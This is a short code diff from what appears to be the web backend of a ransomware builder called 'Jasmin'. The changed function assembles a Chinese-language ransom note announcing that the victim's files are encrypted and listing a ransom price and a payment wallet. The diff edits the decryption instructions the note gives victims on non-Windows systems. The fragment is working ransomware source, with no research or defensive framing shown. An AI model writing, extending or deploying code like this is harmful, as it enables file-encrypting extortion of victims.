@@ -255,7 +255,7 @@ def generate():
     else:
         return jsonify(ok=False, msg='RSA公钥缺失，请先生成密钥对')
     # 构建勒索信
-    dec = '运行 Jasmin_Decryptor.exe → 选择.pem私钥' if plat=='win' else 'pip3 install cryptography && python3 jasmin_decrypt.py key.pem'
+    dec = '运行 Jasmin_Decryptor.exe → 选择.pem私钥' if plat=='win' else 'sh jasmin_decrypt_openssl.sh private_key.pem /  （仅需 openssl，无需安装依赖）\n如偏爱 Python 工具: python3 jasmin_decrypt.py private_key.pem'
     note = f"╔══════════════════════════════════════════╗\n║  {ransom['title']}\n║  你的文件已被加密\n╚══════════════════════════════════════════╝\n\n系统ID: {{sid}}\n\n{ransom['body']}\n"
     if ransom['price']: note += f"\n💰 赎金: {ransom['price']}"
     if ransom['wallet']: note += f"\n💳 支付地址: {ransom['wallet']}"
